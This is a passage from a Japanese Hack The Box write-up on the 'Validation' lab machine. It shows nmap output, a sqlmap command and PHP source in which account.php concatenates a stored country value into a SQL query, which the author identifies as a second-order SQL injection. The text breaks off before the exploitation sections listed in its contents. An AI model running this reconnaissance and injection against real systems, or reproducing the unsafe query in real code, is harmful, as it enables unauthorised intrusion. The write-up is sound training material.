{"componentChunkName":"component---src-templates-post-template-js","path":"/hackthebox-linux-validation","result":{"data":{"markdownRemark":{"id":"3159b8bf-3b33-59f8-be31-1a63923185fa","html":"<p>「Hack The Box」という、ペネトレーションテストの学習プラットフォームを利用してセキュリティについて学んでいます。\n「Hack The Box」のランクは、本記事執筆時点でProHackerです。</p>\n<img src=\"http://www.hackthebox.eu/badge/image/327080\" alt=\"Hack The Box\">\n<p>今回は、HackTheBoxのリタイアマシン「Validation」のWriteUpです。</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 701px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/f4631b855d7057f68e6f602c11d0ae03/49217/image-71.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 74.58333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAAsTAAALEwEAmpwYAAAC00lEQVQ4y3WT207UUBSG59IoMNNpp6dpu3vYPcy5AzNAuNCohAsgEggYhCszakyMSqKSQEwmSOID6IWnRIwPYKIPoI/gI/2u7jIOhHDxp7sra33911rdhZLuoai5yJ5nJWKGh0nZxVWJoeREKJkJxZuQjTaiyCd54G4I3WxSTQeal6JQ1KlQI4DuXoBNEMxq+Li108XyoIdovomi3IFhpGBBC16Ywg+6sKwOKloXEsULJQIVtQx03uWk7MGqM6zuruPjwS5+DrexuTNA98Y0lDKBklnweAY8nEHV7kLTUoJeApTI3bUSw9ydJjauH+PXm8/4e/IdW/0TrA2WIFPbPG4h9hvgrA2dEVBPBbQwmt/ZOQogza2/0sKDrbf48f4r/nz5hsc3j7G8uwhVJ1BcRxJOw6W5qeRQp5aztguXLqXiQ+MuBvsr+PDuCL8/PcXw6DYaC31aQgqbT4NHcwKoOx0RU2gxF1oewScqNm3XgcodLN5Lsfawj6DXgGK2oDGSS4sJe/ACatmrwSBVrNq45RyYnydVBq/WhenXYbpNSqzDSMiFl8VmKNaGWm0giLpgvAnVTaCTytVk3HLmMpNk+LgimVhd38bzl4d4svcK+4dDHA6P8ejFM+wdvMbG3fvQjDr8kD5AzjSW0D9YgxrW8pbHDk/nR+cMzOIOOWrATVJSBxZvIerNgrVobrxxqhr0iKBRApmFOVCxSc55yTaDZNmYUBx4fQ2tpYqYqVS1oLgeQeiGxLk0zqGw3FRh3K6LKXHOJRkBOc3iPlTPg+rTBwyOshFSoY+iSjnZM1so5Yh8qhMOp2gJqhNTi2kOpvcqXa0kXUDcmUfZDMU11P0YXrsG2eIiT3US8OYsLZBujxWOgPkyytVAQMfLCWC4dVE0yhHjYUzMeNSVYkX/YVmsUFQdlCoOioqNqYpFICeXblOCJTSOUa7mjN9JpSxPtUW8bDr4BxJRrXhLT5C3AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/f4631b855d7057f68e6f602c11d0ae03/8ac56/image-71.webp 240w,\n/static/f4631b855d7057f68e6f602c11d0ae03/d3be9/image-71.webp 480w,\n/static/f4631b855d7057f68e6f602c11d0ae03/e2a71/image-71.webp 701w\"\n              sizes=\"(max-width: 701px) 100vw, 701px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/f4631b855d7057f68e6f602c11d0ae03/8ff5a/image-71.png 240w,\n/static/f4631b855d7057f68e6f602c11d0ae03/e85cb/image-71.png 480w,\n/static/f4631b855d7057f68e6f602c11d0ae03/49217/image-71.png 701w\"\n            sizes=\"(max-width: 701px) 100vw, 701px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/f4631b855d7057f68e6f602c11d0ae03/49217/image-71.png\"\n            alt=\"image-71.png\"\n            title=\"image-71.png\"\n            loading=\"lazy\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<h2 id=\"本記事について\" style=\"position:relative;\"><a href=\"#%E6%9C%AC%E8%A8%98%E4%BA%8B%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6\" aria-label=\"本記事について permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>本記事について</h2>\n<p><strong>本記事の内容は社会秩序に反する行為を推奨することを目的としたものではございません。</strong></p>\n<p>自身の所有する環境、もしくは許可された環境以外への攻撃の試行は、「不正アクセス行為の禁止等に関する法律（不正アクセス禁止法）」に違反する可能性があること、予めご留意ください。</p>\n<p>またすべての発言は所属団体ではなく個人に帰属します。</p>\n<!-- omit in toc -->\n<h2 id=\"もくじ\" style=\"position:relative;\"><a href=\"#%E3%82%82%E3%81%8F%E3%81%98\" aria-label=\"もくじ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>もくじ</h2>\n<ul>\n<li><a href=\"#%E6%8E%A2%E7%B4%A2\">探索</a></li>\n<li>\n<p><a href=\"#sqli\">SQLi</a></p>\n<ul>\n<li><a href=\"#second-order-sql-injection\">Second Order SQL injection</a></li>\n<li><a href=\"#union-injection\">UNION injection</a></li>\n</ul>\n</li>\n<li><a href=\"#priv\">Priv</a></li>\n<li><a href=\"#%E3%81%BE%E3%81%A8%E3%82%81\">まとめ</a></li>\n</ul>\n<h2 id=\"探索\" style=\"position:relative;\"><a href=\"#%E6%8E%A2%E7%B4%A2\" aria-label=\"探索 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>探索</h2>\n<p>とりあえずいつもの。</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">Starting Nmap <span class=\"token number\">7.92</span> <span class=\"token punctuation\">(</span> https://nmap.org <span class=\"token punctuation\">)</span> at <span class=\"token number\">2021</span>-10-28 <span class=\"token number\">22</span>:29 JST\nWarning: <span class=\"token number\">10.10</span>.11.116 giving up on port because retransmission cap hit <span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span>.\nNmap scan report <span class=\"token keyword\">for</span> <span class=\"token variable\">$RHOST</span> <span class=\"token punctuation\">(</span><span class=\"token number\">10.10</span>.11.116<span class=\"token punctuation\">)</span>\nHost is up <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>.40s latency<span class=\"token punctuation\">)</span>.\nNot shown: <span class=\"token number\">992</span> closed tcp ports <span class=\"token punctuation\">(</span>conn-refused<span class=\"token punctuation\">)</span>\nPORT     STATE    SERVICE       VERSION\n<span class=\"token number\">22</span>/tcp   <span class=\"token function\">open</span>     <span class=\"token function\">ssh</span>           OpenSSH <span class=\"token number\">8</span>.2p1 Ubuntu 4ubuntu0.3 <span class=\"token punctuation\">(</span>Ubuntu Linux<span class=\"token punctuation\">;</span> protocol <span class=\"token number\">2.0</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span> ssh-hostkey: \n<span class=\"token operator\">|</span>   <span class=\"token number\">3072</span> d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a <span class=\"token punctuation\">(</span>RSA<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span>   <span class=\"token number\">256</span> <span class=\"token number\">46</span>:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 <span class=\"token punctuation\">(</span>ECDSA<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span>_  <span class=\"token number\">256</span> <span class=\"token number\">70</span>:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a <span class=\"token punctuation\">(</span>ED25519<span class=\"token punctuation\">)</span>\n<span class=\"token number\">80</span>/tcp   <span class=\"token function\">open</span>     http          Apache httpd <span class=\"token number\">2.4</span>.48 <span class=\"token variable\"><span class=\"token punctuation\">((</span>Debian<span class=\"token punctuation\">))</span></span>\n<span class=\"token operator\">|</span>_http-title: Site doesn't have a title <span class=\"token punctuation\">(</span>text/html<span class=\"token punctuation\">;</span> <span class=\"token assign-left variable\">charset</span><span class=\"token operator\">=</span>UTF-8<span class=\"token punctuation\">)</span>.\n<span class=\"token operator\">|</span>_http-server-header: Apache/2.4.48 <span class=\"token punctuation\">(</span>Debian<span class=\"token punctuation\">)</span>\n<span class=\"token number\">5000</span>/tcp filtered upnp\n<span class=\"token number\">5001</span>/tcp filtered commplex-link\n<span class=\"token number\">5002</span>/tcp filtered rfe\n<span class=\"token number\">5003</span>/tcp filtered filemaker\n<span class=\"token number\">5004</span>/tcp filtered avt-profile-1\n<span class=\"token number\">8080</span>/tcp <span class=\"token function\">open</span>     http          nginx\n<span class=\"token operator\">|</span>_http-title: <span class=\"token number\">502</span> Bad Gateway\nService Info: OS: Linux<span class=\"token punctuation\">;</span> CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class=\"token builtin class-name\">.</span>\nNmap done: <span class=\"token number\">1</span> IP address <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token function\">host</span> up<span class=\"token punctuation\">)</span> scanned <span class=\"token keyword\">in</span> <span class=\"token number\">137.03</span> seconds</code></pre></div>\n<p>80番ポートで何かよくわからないWEBアプリケーションが動いてました。</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 824px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/78e7457e76ed057957b5367ccf27cb3d/c1c45/image-72.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 74.58333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAAsTAAALEwEAmpwYAAABlUlEQVQ4y62O2U4CQRBF+1vUxA0jIgJiRGQRAYkobogaDTH+gi8++YmgrL5oEElkGMAh7NeuZgZB8W06Oanqqlu3ivX7fXS7XVSrVXwpCo81KEoDsiyj1Wqh0WigVqsJSDPoK0JTLkuoVCpoNpsgn16vBwb+2u02Uqk0isUP5PMvKBTekU5nUK/XUSqVkEg8IZvNIZPJiv7r6xtyuTySyWcxJ0kStMdoyydtkqt8myyixKPMLylLFZFrdQ2qUU/mFxMSz8mDvJg7cAh3IIJBHMcTjAwRmqCK2nepjM6wpTUHRjGoccG0gVnjOuZW7Jgz2jHP/yLyv8E8rh2FmewuDFmn6May1Qnv3hHCJ1fwh88E27vhYb664cGKqh2b5zBq/GbZto1QJIbo9R1OLuI4jsWF0enlLSLnN7A4fGLppNk/hkZuRptd/gNsekNw8ssCB1Fs+fbFlTuhY2FIuomGdP4kNAGZ25x+WLmJVqO++Z85Nm1YwyRmDJYhU4tmzk/tvxmC3T88Qk8YdH6s0+lAT/S/UG/Db+CMQc8/VzPUAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/78e7457e76ed057957b5367ccf27cb3d/8ac56/image-72.webp 240w,\n/static/78e7457e76ed057957b5367ccf27cb3d/d3be9/image-72.webp 480w,\n/static/78e7457e76ed057957b5367ccf27cb3d/5758c/image-72.webp 824w\"\n              sizes=\"(max-width: 824px) 100vw, 824px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/78e7457e76ed057957b5367ccf27cb3d/8ff5a/image-72.png 240w,\n/static/78e7457e76ed057957b5367ccf27cb3d/e85cb/image-72.png 480w,\n/static/78e7457e76ed057957b5367ccf27cb3d/c1c45/image-72.png 824w\"\n            sizes=\"(max-width: 824px) 100vw, 824px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/78e7457e76ed057957b5367ccf27cb3d/c1c45/image-72.png\"\n            alt=\"image-72.png\"\n            title=\"image-72.png\"\n            loading=\"lazy\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>ユーザ名と国名をPOSTすると、自動的に登録して、同じ国のユーザを表示してくれるアプリケーションのようです。</p>\n<p>ユーザ名を取得して表示しているので、SQLiが刺さりそうという観点から調査を進めます。</p>\n<p>一応XSSの脆弱性もあったのですが、シェルにはつながらないタイプのXSSだったのでスルーします。</p>\n<h2 id=\"sqli\" style=\"position:relative;\"><a href=\"#sqli\" aria-label=\"sqli permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SQLi</h2>\n<p>試しにSQLmapの探索をかけてみたのですが、<code class=\"language-text\">username</code>も<code class=\"language-text\">country</code>も<code class=\"language-text\">does not seem to be injectable</code>と出てしまいました。</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">python3 sqlmap.py -u <span class=\"token string\">\"http://<span class=\"token variable\">$RHOST</span>/\"</span> --data <span class=\"token string\">\"username=test&amp;country=Ukraine\"</span></code></pre></div>\n<p>どうやら入力フォームにはエスケープが存在しているようです。</p>\n<h3 id=\"second-order-sql-injection\" style=\"position:relative;\"><a href=\"#second-order-sql-injection\" aria-label=\"second order sql injection permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Second Order SQL injection</h3>\n<p>このアプリケーションには、Second Order SQLi の脆弱性があります。</p>\n<p>参考：<a href=\"https://gallu.hatenadiary.jp/entry/20060105/p1\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">second-order SQL injection ( セカンドオーダーSQLインジェクション ) - がるの健忘録</a></p>\n<p>実際のところ、このアプリケーションは裏でこのような処理が動いていました。</p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n  <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'config.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REQUEST_METHOD'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">'POST'</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$userhash</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"INSERT INTO registration (username, userhash, country, regtime) VALUES (?, ?, ?, ?)\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$stmt</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$conn</span><span class=\"token operator\">-></span><span class=\"token function\">prepare</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$stmt</span><span class=\"token operator\">-></span><span class=\"token function\">bind_param</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"sssi\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$userhash</span> <span class=\"token punctuation\">,</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'country'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$stmt</span><span class=\"token operator\">-></span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n            <span class=\"token function\">setcookie</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$userhash</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Location: /account.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">exit</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"update registration set country = ? where username = ?\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$stmt</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$conn</span><span class=\"token operator\">-></span><span class=\"token function\">prepare</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$stmt</span><span class=\"token operator\">-></span><span class=\"token function\">bind_param</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"ss\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'country'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$stmt</span><span class=\"token operator\">-></span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">setcookie</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$userhash</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Location: /account.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">exit</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token delimiter important\">?></span></span></code></pre></div>\n<p>POSTで送られてきた値をプレースホルダを通してDBに格納し、<code class=\"language-text\">/account.php</code>にリダイレクトしています。</p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n  <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'config.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT username, country FROM registration WHERE userhash = ?\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token variable\">$stmt</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$conn</span><span class=\"token operator\">-></span><span class=\"token function\">prepare</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token variable\">$stmt</span><span class=\"token operator\">-></span><span class=\"token function\">bind_param</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"s\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$user</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token variable\">$stmt</span><span class=\"token operator\">-></span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  \n  <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$stmt</span><span class=\"token operator\">-></span><span class=\"token function\">get_result</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// get the mysqli result</span>\n  <span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$result</span><span class=\"token operator\">-></span><span class=\"token function\">fetch_assoc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// fetch data   </span>\n  <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;h1 class=\"text-white\">Welcome '</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'&lt;/h1>'</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;h3 class=\"text-white\">Other Players In '</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'country'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'&lt;/h3>'</span><span class=\"token punctuation\">;</span>\n  <span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT username FROM registration WHERE country = '\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'country'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"'\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$conn</span><span class=\"token operator\">-></span><span class=\"token function\">query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$result</span><span class=\"token operator\">-></span><span class=\"token function\">fetch_assoc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;li class='text-white'>\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"&lt;/li>\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token delimiter important\">?></span></span></code></pre></div>\n<p>先ほどのindex.phpの入力フォームではSQLクエリがプレースホルダされていましたが、リダイレクト先のaccount.php内の、ユーザや地域を取得する箇所にはプレースホルダが存在していませんでした。</p>\n<p>そのため、Second Order SQLiの脆弱性が存在します。</p>\n<p>というわけで、リダイレクトのタイミングでCountryの入力欄に<code class=\"language-text\">'</code>を入れると、<code class=\"language-text\">Faital Error</code>がブラウザ上に表示され、SQLiができそうなことがわかります。</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/bbab3fe536e329528e641f802c96bf88/2bef9/image-73-1024x651.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 63.74999999999999%; position: relative; bottom: 0; left: 0; background-image: 